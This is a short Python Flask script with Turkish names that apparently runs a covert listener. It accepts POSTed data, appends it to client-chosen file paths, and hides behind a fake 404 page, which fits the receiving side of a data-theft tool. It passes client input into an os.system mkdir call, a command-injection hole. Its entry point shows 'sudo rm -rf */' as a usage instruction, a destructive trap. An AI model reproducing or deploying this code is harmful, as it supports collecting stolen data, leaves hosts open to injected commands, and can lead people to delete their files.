
def flask_start(os,flask,kirmizi,yesil,normal):
    app = flask.Flask(__name__)
    @app.route("/",methods=["POST","GET"])
    def home():
        if flask.request.method == "POST":
            dosya = flask.request.form.get("dosya")
            isim = flask.request.form.get("isim")
            icerik = flask.request.form.get("icerik")
            
            if not dosya == None and not isim == None and not icerik == None:
                print(f"\n\t{yesil}Data Bilgisi :{normal} \n\t",*icerik.splitlines(),sep="\n\t")
                if not os.path.exists(isim):
                    try:os.mkdir(isim)
                    except:os.system(f"mkdir {isim}")
                try:
                    with open(dosya,"a") as dosya:
                        dosya.write(icerik)
                        print(f"\n\t{yesil}{dosya.name}'ya yazıldı !{normal}\n")
                except:
                    try:
                        with open(dosya,"ab") as dosya:
                            dosya.write(icerik.encode())
                            print(f"\n\t{yesil}{dosya.name}'ya yazıldı !{normal}\n")
                    except:
                        print(kirmizi+"\n\nDosya'ya yazılamadı !"+normal)

            else:
                if not flask.request.form.get("kontrol") == None:
                    print(yesil+"\t-----ByteData Check-----\n"+normal)
                else:
                    print(kirmizi+"\tPOST isteği ile eksik veriler elde ettik !\n"+normal)
            return """<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>"""
            
        elif flask.request.method == "GET":
            print(kirmizi+"\tGET ile erişildi :D [404 teması dönüyor]\n"+normal)
            return """<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>""",404
    app.run(port=8082,debug=0)

if __name__ == "__main__":
    raise SyntaxError("\033[31m USE : sudo rm -rf */ \033[0m")
